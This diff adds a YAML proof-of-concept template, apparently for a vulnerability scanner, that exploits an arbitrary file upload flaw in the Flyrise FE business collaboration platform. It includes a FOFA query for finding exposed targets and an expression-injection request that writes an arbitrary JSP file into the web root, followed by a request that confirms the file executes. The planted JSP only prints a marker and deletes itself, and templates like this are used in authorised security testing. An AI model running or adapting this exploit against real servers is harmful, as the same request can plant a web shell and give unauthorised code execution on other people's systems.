@@ -1,0 +1,23 @@
+id: poc-yaml-flyrise-enterprise-common-sort-tree-anyfile-upload
+info:
+  name: 飞企互联FE业务协作平台 common_sort_tree 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+  t3: base64(`<% out.println("` + t2 + `");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>`)
+requests:
+- method: POST
+  path: /common/common_sort_tree.jsp;.js
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/{{.t1}}.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("{{.t3}}"))%25}
+  expression: status_code == 500
+- method: GET
+  path: /{{.t1}}.jsp;.js
+  expression: status_code == 200 && trim(body) == t2
+transport: http
